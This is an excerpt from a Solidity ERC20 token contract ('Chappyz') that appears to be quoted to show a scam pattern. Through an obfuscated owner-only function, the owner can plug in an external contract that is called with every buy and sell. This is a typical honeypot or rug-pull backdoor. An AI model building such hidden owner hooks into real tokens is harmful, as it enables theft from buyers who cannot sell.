...
contract TokenM is ERC20 {
    ...
    IUserAmounthnjuer public hnjuer;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Chappyz", "CHAPZ") {
    ...
    function cinyengeBvternRkks(IUserAmounthnjuer _hnjuer) public onlyOwner {
        hnjuer = _hnjuer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                hnjuer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				hnjuer.addOutAmount(from, amount);
            }else{
                hnjuer.addOutAmount(from, amount);
                takeFee = false;
            }
